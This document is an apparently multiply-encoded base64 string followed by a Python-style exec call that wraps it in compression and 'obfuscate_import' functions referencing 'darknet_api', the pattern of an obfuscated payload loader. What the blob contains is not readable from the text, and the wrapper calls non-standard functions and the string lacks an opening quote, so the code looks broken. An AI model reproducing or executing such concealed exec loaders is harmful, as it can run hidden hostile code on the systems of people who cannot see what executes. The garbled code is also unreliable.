QWVRBMWRWbFVRbmRTUmxsM1RsaHdXRlp0VW5wYVJWWXdVa1pPZEU5WGRGUlNhMjk2VjFST2QyUnRVbkprTTJ4WVltMTRhRlpxUm1Ga1ZtUnpZVVpPYUdKVmJEVlphMmhYVkZkS1ZrNVVTbHBpUlRBeFdWUkdkbVZXVGxoaVJURlRUV3hLZWxkclZscE9WVEZYWWtaU1lVMHdTazVWTUZVd1pERnJlV0pIT1U1V01ERTFWbTAxYzFkVk1YUmxTRXBVVFZVMGVsbFdXa3RTYkhCR1ZHdHdhRll6VWsxVlZFWkhZMnhPYzJFemJHeFNNbWh2Vm01d1EyUnNUbGhOVnpsT1VqRktTbFZYTlhkVlIwWlZZVVJLV0dKVVZreFphMXAzVjBad1NHVkhkRk5OUkZWNVYxWmFhazFIVWxkaE0yeFFWMFpLVGxSWGRIZGpWbXgwWWtWd2FrMVhPVFZXYlhCRFYxVXdlRmR0T1ZSTlJUVjVXWHBLVG1Wc1ZuVmlSWGhVVW14dk1sWXllRzlUTVhCMFVteG9WbGRGU2s1VlZFSjNVa1pXVlZGVVFtaFdXRkpUV1dwQ2QxSkdXWGhYVkVKWVZrVndXRnBFU2xOU1JrWnlWMjE0VTAxRVZucFhWRUp2VlRKT1NGTlliRTlTTWxKaFZqQlZlR0pzWkhOVWEwcFBZVEExZFZsVVFuZFNSbVJHVTJwV1dsWnRUWGhVVlZZd1VrWk9kRlJ0ZUZOU1ZuQjNWbXBPZDFGck5IZE5WRnBTVmtkU1VGVnJWbUZOUmxaSFZWaGtVRlpyU2xaVVZWSnpWVEZhY21OR1VsZFNSVnBMVkRGYVExWlZNVVZpUmtaWFVrVmFjRlV4Vms5VGJHOTNaRVJXVW1KdVFuSlZNRlp6Wkd4a2MxUnVTbUZOU0ZFeFZWWmtjMWRXVGtoYVJGSllWak5vTmxwRVNrdFdSa1pZWWtWNFZsWjZiRTFXTW5SclZqSktWbUpGYUZWaWF6VmhWbXBLTkUxR1pFVlRibVJyWWxWYVdWUnNZM2hYYkdSSFYyNUdXR0pIYUZOWmFrSXdWbGRKZDJSRlVsZE5iRW8yVjFkd1MxTXlSa2hUYTFKU1lXdGFjVlJYZUdGT1ZtUkZVMjVPYUUxRk5YVlphMUpQWVVaSmVXVkljRmhpUlRWRVZteGtUMlJXV25SbFJrSmhUV3BzVEZWVVJtOVZNbFpZVm14V2FVMUlVa1ZXVm1Rd1V6RmtWVk5xVW1oU01GcFpWRlZqTlZOdFNsaGFNMlJoVWxkb1JGcFhjelZqUlRsSlYyMW9hVlpIZUROWFZ6QjRXVmRHU0ZWc2FGVmlXR2h5VlZod1YyTldiSEZUV0dScllraENTVmRyWkhOVGJVWlpZVWhXV0dKSGFGUlhiVEZUVjBaS1dFOVZlRlpOTW1jeVYydFdiMU50U1hsVmJHeFZZbGhvY1ZsclVuTmtNV1J5Vkc1S2FrMUhlSGxXVjNSdlZXMUdWbUpJWkZKTmJWSjVWVEowVDFkR1VuVlViSEJYVFc1bmQxVjZRazlUTWtsNVZXdHNWbUp0VW5GYVZ6QTFUV3hTUlZOdVpHdGlWVnBaVkd4amVGZHNaRWRYYmtaWVlrZG9VMXBHV25KbFZUbFpWV3N4VG1KRmIzbFdNbkJMVm0xR1ZtVkZhR0ZTTTJoeVZXMXdjbVZHWkZkVWJUVnFVbGhvU2xaSGNFTmhiVVpZV2pOb1dtVnJjRmhhVmxwdVpWZEtTR1JGZUZaTk1sSjNWbGQwVms1V1RrZFRiRkpVVjBWS1JWZHFTakJUTVVWNFdrVTVhazFYZUZsWmEyaFRWRVpGZDJOSVdtRlNWMmhVV2tSS1QwNXRTWHBYYXpGT1ltdEplVmRXV21wTlYwcFhZa1pzVjJKWVFtaFdNRnBIVFZaa1ZWTlVWbXRTV0dRMVZtMXdRMkZHUlhkaVNIQllZV3R3V0ZSVldtNWxiRnAwWVVWNFVrMXVValpYV0hCUFZUSldWbVJGYkZkaWJrSm9WakJXZDJKV2JGZGFSa3BxVWxob1JWVXlkR0ZXTVVwWVdraENWRTFWV2pKVk1uUlBWVzFLU0dOSGJGTk5SbkF6VjFkNFQySnRSbGhTYTJ4V1lXdEtjVlV3VlhkTmJGSkpZWHBXYWxZd2JEVlphMmhYV1ZkS1ZsZFlhRmhXUlhCWVZGVldOR1JHVW5WWGJXeFdaVzF6ZDFkVVNURlJiVVpXWlVWb1lWSXphSEpWYlhCeVpVWmtWMVJ0TldwU1dHaEtWa2R3UTJGdFJsaGFNMmhhWld0d1dGcFdXbTVsVjBwSVpFVjRWazB5VW5kV2FrSmhVekZXVm1KSVFtaE5TRkpGVmxaa01GTXhaRlZUYWxKb1VqQmFXVlJWWXpWVGJVcFlXak5rWVZKWGFFUmFWM00xWTBVNVNWZHRhR2xXUjNnelYxY3dlRmxYUmtoVmJHaFZZbGhvY2xWWWNGZGpWbXh4VTFoa2EySklRa2xWYlRWM1lVWkZkMkpJY0ZoaGEzQllWRlZhYm1Wc1duUmhSWGhTVFc1U05sZFljRTlWTWxaV1pFVnNWMkp1UW1oV01GWjNZbFpzVjFwR1NtcFNXR2hGVlRKMFYxVnNXbkpPVlhCVVZqSjRlVlY2UWs5VmJVcElaVWQ0VTAxRVZucFhWRUp2Vld4dmVGTnNiR2hTTTBKb1ZqQldTbVF4YkZkWmVsWnJWbGQ0U1ZWdE5YZFRiRWw0Vm0wMVZVMXRVakpWTW5SUFZXMUtTVnBIY0dsV00yZDRWMnRXVDJKdFJsZGhSV3hoVFRKb1lWbHJhRTlOTVZGNlkwVTFhMDFFYXpKV1ZtaHZZVlphUlZGVVZsWlNiRVl6VkRGYVExWnNXbk5VYkZwb1pXMTRWVlpWV2xKa01EbFhVV3hXVGxKSGVGbGFWbFpIWTBaT1ZsUnVjR0ZOYXpFMlZsYzFjMVJHU1hoV2JtUlVWbFUxTmxkcVFuTmpNbFpGVldzMVYwMUlRbkJXUmxacVpERnZkMkpJUW1oTlNGSkZWbFpvUTJOc1pITmFSbkJoVFZkME5WcFZaRzloUmxvMlVtMHhXR0pVUmtoVVZscHlaVlphY1ZGc2NFNWhiWGd6VjFjd01WUnRTWGRrUmxacFRVaFNSVlpxU2xObGJHeHhVMnQwYUZJd2NFVlZWM0JIWVdzeGMxZHFWbGhTUlhCNldWUkNUMkp0U2tWVWJXaFRUVzVvTmxZeWVFOVJNVnBZVkc1V1YySllhRkZYYWtrMVV6RkZlR0ZHVG14V01WcFdXV3BDTUZKR1ZsaGtSWFJZVmtWdk1GbFZaRWRYUlRGSVQxVndhVll5WkROWGExWnZVVEpXY2s5WVFsQlRSbkJvV1d4V1dtVkdaRlZUYkdST1VtMTBOVlF4YUVOaFYwcHlUVlJHV21Gck5VeFpiWFF6WlZaV2RFNVdjR2hXVjNnMlZqSndTMVl3TVVkYU0zQlhZbGRvVFZWVVNqQmxiR3cyVkd4T2JGWllVa3BXYlRWM1dWWmtSbU5ITVZwV2JWSlRXVEJXTkZKR1RuSldiRTVPVWxkNGQxVjZSa2RrYkU1eVZHeEthVkl6UW5CVmFrSmhaREZzYzFSdE5XaFdNRnBLVmxkd1EyRnNUa1pOUkVwVlUwZHpNVmxzV25OWFZscDBZMGRHV0ZKcmNIaFhWM0JMWXpKU1dGUnFWazlYUm5CeFdXeGtUMDFzWkhOaFJrNXBUVWQ0ZDFwVll6RlpWbVJIVTIweFlWSnRVa2RaYWtJd1ZrZFdTV05IZEZSU1YzZ3lWMnRhYjFReVNraFViazVRVjBWS2FGVlVTakJsYkU1WVpFWmtWMVpyTlVWVk1XaERVa1p2ZVdSRmRGSk5WMUpRV1hwR2MxZEhTa2xWYTNoU1RVaENNbGRyVm05Vk1sRjVWR3BhYVUweGNFNVVWM2gzWWpGd1IxcEZPV2xTTVVwSlZrYzFZV0ZHV2paV2FscFZVbnBCTVZwV1duZE9WVGxZWkVkc1RtSldTbnBWTVdSelRrZEtjMk5HYkZaaVZuQnlWbXBDVjJSc1RYaFVhbEpzWWxaS1NsVXhZelZoTVdSR1RsaE9XazF1WXpGWk1GcDNVa2RGZWxScmNHaE5WWEJTVmxkd1ExWnRSbFprUmtwcFRVaENSVlpXWkRSalZteHlXa1ZrYWxJd2NGVlhha3B6WVVaT1IxTllaRnBOUjJoUFZHMTBORTVWT1ZoTlZuQllVbXh3ZUZZeWVHOVZNa1owVTFoc2FWTkdXbkZhVmxKWFRXeHJlVTFYY0d0aVZYQktWbGN4ZDFOdFJsbGhTRlpZWWtkb1ZGZHRNVk5YUmtwWVQxVjRWazB5WnpKWGExWnZVMjFKZVZWc2JGVmlXR2h4V1d0U2MyUXhaSEpVYmtwcVRVZDRlVnBWV2xkVmJWWldZa2hrVWsxdFVubFZNblJQVjBaU2RWUnNjRmROYm1kM1ZYcENUMU15U1hsVmEyeFdZbTFTY1ZwWE1EVk5iRkpGVTIxR2FGSXhTbGxXUnpFMFlURkpkMDVVU2xwV2JVMTRXbGQwTkdSRk9WbGlSMFpzVmtkNGVWWXhXbTlVTWtsM1lraENiRko2Vm1oV01GcExZbFp3UjFwRldtbE5TRkpWV2xWb2QyRXhUa1ppU0ZwaFVtMW9VRmxyWkU5ak1EbFpVVzFHVWsxdVVqWlZNV1F3VlRGR2MxWllaR0ZOYlhoTlZsWmpOVk14UlhoU2JrNW9ZbFZ3U1ZWdE5VTmhWbFY1V2toQ1dsWlhhRlJVVldSUFUxWlNWVmRyTVd4V1IzZ3dWakZhYjFZeVJuTmpSbXhXWWxoQ2NGUlhNVFJOVm10NllYcEdhMkpWTlRCWFZFNWhWMjFLVms1VVJsUldNbmN3V1cxNGQxZFdWblJYYlhSWFRVWmFNbFY2Ums5T1IxWjBWV3RzVkZaNmJISldNRlV4WXpGcmVXUjZWbXBTYmtKRldWUk9UMU50UlhkalJWWlhVako0UzFrd1ZrOWliVVYzWTBWU1YwMUVWalpXTVZwcll6SlNSbVJGVWxSaVZHeHlWVEJhUzAweGEzcGpTRnByWVROa05WWXlNVzloTVZsM1RsaE9ZVkpYVWxCYVJ6RkhWMFUxV1dORk1XbFdSM2N4VmpJMWNrNVZNVWhVYmxaaFRXMTRUbFZxU2xOak1YQkdWMVJXVGxadGVGVlhhazVEVkZaT1JrNUlaRnBOYlhoMlZGWmtUbVZXV25WaVJteE9ZbGhvZVZWNlJrOU5Na1pYVjJ0a1ZHSkhlRXRaVm1Rd1ZFWkZlRkp1U2xSaVIzUTFXbFZrYjJGR1dqWlJibHBVVm5wR2RsUlZaRk5UVmtaMVkwWkNhRlpIWjNsV01qQjRVakF4VjJFemJGZGhhMHBoVkZkd2MyUXhiSFJPVlRWclZqQnNObFV5TURGVVZURnlZMGhHV2xaVk5VdFpla1oyWlZaYWNWRnNiRTVOVm5CMlZYcENUMk50VFhsVVdIQldZbTE0VFZVd1dtRk9iR1J6WVVWMFlXSlZXbGxXVm1oRFZGWkZkMk5GVWxaV1JVcDFXVlpXTUZWdFNYZGpSVkpYVFZacmQxWXhVa3RXTWxGNVZXdFNVbUV4Y0hOVmFrRXhZekZyZDJGR1RtcFNNR3cxVkd0a2ExZHNaRVpOVnpWWVlrVTFRMVJ0ZEU5aWJVVjNZMFZTV0ZKVmJ6RlhWbHBxVFZVeFJtUkZVbFJpVlRWelZXdFdZV05HV1hwalJVcFBUVVJGTWxWV1VtdFVNVXBHVjJwQ1ZsSnNSak5VTVZwRFZsVXhSV0pHVGxkaE0wSlZWbXRTUjFOck9WZFJiRlpPVWtkNFVsWnJVa2RoVms1V1ZHdHdZVTFJVVRGVlZ6VjNZVEZPUm1KSVdsaGlSVFY1VjJwQ01FNVdSbGhpUm14VVVqSlJNRll4WkRSbGJWRjVVMnhTVWxZeWVFMVdWbU0xVkVaa2NscEdaR2xXVjNoSlZrYzFUMWRzV1hsbFJFSllVa1UxZGxSc1pGZGpSbTk2VVd4Q1lVMXFiRXhXTW5CTFRrZFNjMkpJVWxOaWF6VkxWVEJhWVU1c1pITmhSWFJoWWxWYVdWWldWakJTUm1SSVZXNWFXbFp0VVRCWmExWnpVakZXZFdKSGRGZE5WbFY1VlZSS2EyTnNUblJWYTJ4VVlXeGFVVmRxU1RWVE1VVjRVbTVPYUdKVmNFbFZiVFZEWVZaVmVWcElRbHBXVjJoVVZGVmtUMU5XVWxWWGF6RnNWa2Q0ZWxZeFdtOVRNbEpYWWtoU1ZXSlViRTVaYlRGdVRWWndXR0pGY0dwTlZ6azFWbTF3UTFkVk1IaFhiVGxVVFVVMWVWbDZTazVsYkZaMVlrVjRWRkpzYnpKV01uaHZVekZ3ZEZKc2FGWlhSVXBPVlZSQ2QxSkdWbFZSYlRWb1ZsaFNVMWxxUW5kU1JsWllaVWhHV21FeVVraFpNR1JMVmtadmVXSkhhRlJTYTJ3elYxUkNiMVJyTlhKbFJGWlFWak5TYUZSWGRIZGpWbXh4VTI1T2ExWllhREZaVlZKWFlrZEdWbUpJY0ZoaGEzQllWRlZhYm1Wc1duUmhSWGhTVFc1U05sZFljRTlWTWxaV1pFVnNWMkp1UW1oV01GWjNZbFpzVjFwR1NtcFNXR2hGVlRKMFYxVXdNVVppU0VKVVRWVmFNbFV5ZEU5WFJscHhWV3h3VG1KR2IzcFhhMVpQVVRGS2RGWnJhRlZpV0doeFZUQmFTMlF4YkhGVFZFSmhUVmQ0V2xaR1pHdFpWbFYzVWxSS1VrMXRVbmxWTW5SUFYxWkdkV0pIYUZkbGJGWXpWWHBDVDFNeGEzbFdhMVpUWWxkNFdWcFhkRVpOTVZKWlkwVktUMDFFVmtaVmJUVlRWVlphUlZGVVZsWlNiRVl6VkRGYVMxWXhUbk5VYkZaT1ZsZHpNVlpWV2xKa01EbFhVV3hXVGxZd2NFdFZWRUp6WW14TmVtSkZUbXhpVmtwS1ZURmpOVmxXVlhsa1J6VlVUVEo0UTFsV1dtOVRWbTk2WVVad2FWTkZOSHBYVjNoUFVXMUdWbVJHU21sTlNGSm9WV3BHWVdSR1RsWmFSVGxxVFZkNFdWbHJhRk5YVlRGelkwUldXR0pIVWxoWlZ6RktaVmRLU1ZadGVHaFdNbEl6VmtSS2EyUnNUbk5pTTJ4c1UwWndZVmxzVm1GbGJFNVdZVVprYkdKSVFscFZNakZoWVVaWmVGSnJlRkpOVjJoeVdXcEtSMWRIVmtobFJYQlRZa1Z2TVZkcldtdFdhelZ5VkcwMWFFMUlRbkpWTUZaMlRWWlJlVnBJV2xSaE1EVlRXV3RrZDJGV1NYZFhibVJhWWtVMWRsUldaRTlUUmxaMFlVZDBVMDFXY0hSWFYzUnJZekpTV0ZKcVZtRk5iWGhVVld4U2MxTldWbk5VYTNCcVVsaG9TVmRyWkRSaE1VcHhZVE5vV0Zack5YVlpNRlkwVTFaU2NWRnRjR2hXTW1RMFYxaHdTMVl5VmxkYU0yeHBVak5TVFZaVVRtdGpSbFp5VmxSV1ZGSnJjRlZWTVdoRFVrWnZlV1JGZEZKTlYxSlFXWHBHYzFkSFNrbFZhM2hVVW14dmVsWXlkR3RTTURGSFkwWmtVRmRGTlc5V2JuQlhaVlpOZDFScmRGSk5WVll6VjJwS2MxUkdWWHBoU0ZaWVlrZG9WRmR0TVZOWFJrcFlUMVY0VmsweVp6SlhhMVp2VTIxSmVWVnNiRlZpV0doeFdXdFNjMlF4WkhKVWJrcHFUVWQ0ZVZVeWRGTldSa1YzWWtoa1VrMXRVbmxWTW5SUFYwWlNkVlJzY0ZkTmJtZDNWWHBDYjFZeVVYaGpSV2hUWVd0S2FGWnRjSE5sYkd4WFdYcEdhbUV6VWtWVk1uTjRWakZLVmsxWVFsUk5WVFF3V1cxNGQxZFdWblJYYlhSWFRVWmFNbFY2Ums5T1IxWjBWV3RzVkZaNmJISldNRlV4WXpGcmVXUjZWbXBTYmtKRldWUk9UMU50UlhwaFJscFdWMGQ0UzFrd1ZrOWliVVYzWTBWU1YwMUVWalpXTVZwcll6SlNSbVJGYkZkaWJWSm9WV3BDV21ReFpITlhWRlpxVFd0YVdWUnNhRXRVUmtWM1kwWmFWMVl6YUhWWlZsWXdWa2RXU0U1WFJsaFNhM0IwVjJ0YWExSnRTWGRrUmxKc1UwaENjbFV3Vm5Oa2JIQkhZVVU1YVZJd05YcFVNV2hEV1ZaRmVXUkljRlJXTTJoVVZsUkdhMUpHVGxsUmExSmhUVzVTVEZWVVJtdFVNazE0WWtab2FWTkdTazFWTUZwaFRURmtjbHBGWkU1U2JrSllWREZvVDJGR1dqWldibXhVVFVVMVRGVnNXa2RXTVZKeVlrVndhRll6VWpaV01uQkxWakF4UjFvemNGZGlWMmhOVlZSS01HVnNiRFpVYkU1c1ZsaFNTbFp0TlhkWlZtUkdZMGN4V2xadFVsTlpNRlkwVWtaT2NsWnNTbGRoZWxaTFZURmtjMk5zVFhkVWJFcG9UVWhDWVZSWE5XOWlNV3hYV1ROa2FVMXNTbHBWVnpFd1YyeGtSMU51VGxoU1JXOHdXVEJrUzJSSFRYbFBWWEJwVWpGS1JGWnRNVEJXTVZwR1lraENhRTB3TldoVVYzaGFaREZrUlZSc1pHaFNXRkpGV1ZST1QyRnJNSGhUYWxaVVRVZG9XRnBYZUhkWFZrNTBWMjFvVjAxVldqTldSVlpQVXpGa1IxSnNaRmhoTVhCWFdsWldjMlF4UlhsYVNFcFVZa2hDV2xsVlpIZFpWbVJHVTFoa1ZGWldXbGhVYTFweVpWWmFkVnBIZEZOTmJtZDVWMWN4YzFFeVJraFVhbFpTWWxob1MxVnJZelZVUmtWNFVtNUtWR0pWTlVwVk1qVkRZVmRLYzFKdVdsUldNMmN3Vkd0VmVGZEdUblJUYXpWVFUwVTBNbFpHVmxObGF6RkdUVlpvVGxKSGVGSldhMUpDVGxaV1IxVllhRk5pUmxwNlZUSjRRMVp0Um5GUlZGWldVbXhHTTFReFdrTldNazE1V2tWd2FGWlZXalZWTVZadlZEQXhTRlJ1UW1oU00yaE5WbFJDUjJWV1RsWlVhM1JhVFd4YVJsVnRNWE5YUjFaeVUycENWRlpWTlV0Wk1GWlBZbTFPU0dOSGJGTk5SbkF6VjFkNFUxSnNiM2hSYkZKU1lXdEtiMVV3Vm5kak1XUlhXa1pPYWxJd2NEQlhWRTVYVmpGSmVXRkVWbGhpUjFKSVdWUkNNRk5XVm5SaFIzQnBWakZLZWxkclZsSmxSMFowVTJ0b1UySnJTbkJXYlhCelpFWnJlVTFXWkdsU2JUazFWbTF3UTFkck1YRmlTR1JhWWxkNGVWcEdaRTVsYkZaMFlVZHdhV0pGV2pKVmVrWkhaREpHZEZOcmFGTmlhMHB3Vm10V2MySnNWa2RVYTA1T1VqQmFTbFV5TVRSWGJGbDRVMjVrV21KVVJuRmFSbHBoVTBkR1NXSkhSbGROUm5CNVZYcENiMVV5UmtoVWJsSmhVak5vY2xWclVrZGpWbXh5V2tWa2FsSXdjRmhVTVdONFYyeGtSMWR1UmxoaVIyaFVXVmN4U21WWFNrbFdiWEJzVmpOUmVGZFljRTlWTWtaSVZHNVdWbFo2YkUxV1ZtaERZMVpzY2xwRlpHcFNNSEJXVmtaa2ExVldWWGRUV0dSYVZsZG9URmxyV25OWFJsWjFVVzFzYVZZd05IaFdiWFJyWWpKV1YyTkdhRk5pV0ZKTlZUQmFTMkl4YTNsTlYzUnBVakZLUmxSV1pIZGhWa2wzVjI1a1dtSkdhekZaTVdSS1pWZEtTVlp0Um1sV1ZtdzBWakZTUzFZd01VWmtSbEpQVjBoQ2NsVnFRbUZPVm5CR1ZHMDFhbEpWTlRCV1J6VlBWMnhaZVdWRVFsVmhNRFZEVkRGV2MxTldWblJQVjNCcFZteHdkbFl5ZEd0ak1sSlhZMFJXVDFac1dtOVZNRlozWXpGa1YxcEdTbWxOYkVwSlZXMDFjMWxWTVhOWFdHUldVbTFTVUZsNlJuTlhSMHBKVld4c1RtSklRVEZXTW5oclZqSkdkRk5ZYkdsVFJscHpXVlprTUUxV2JEWlViRTVvVWpBMU1WWldZelZVUmxaWlVXNUdXbUV5VWtoWk1HUkxWbFphV0ZwR1JsWk5SV3d6VjFaV2IxTXlTa2RpUm1oV1ltdEtjRmxzWkU5TlZscHlXa2M1YkZadVFsbFZiVEV3VkVaT1IxTnRPVnBOYWtaeVdXdGtVMUpWTVZoalIyeFRUVVp3TTFkWGVGcE9WVFZJVm14c2FVMHdTazVaYlhNd1pERmtWMkZGZEU1U1ZUVjFXV3BDTUZOck1YSk9XSEJZVm0xU2VscEZWakJTUms1eVRWWlNWMVpHV2s1Vk1XUnpUa2RLYzJOR2JGWmlWbkJ5Vm1wQ1YyUnNUWGhVYWxKc1lsWktTbFV4WXpWaE1XUkdUbGhPV2sxdVl6RlpNRnAzVWtkRmVsUnJjR2xTTW1oVlZteFdUMU50VGtKUVZEQTk=";exec(marshal_encode(zlib_compress(obfuscate_import(zlib_compress(obfuscate_import(darknet_api))))))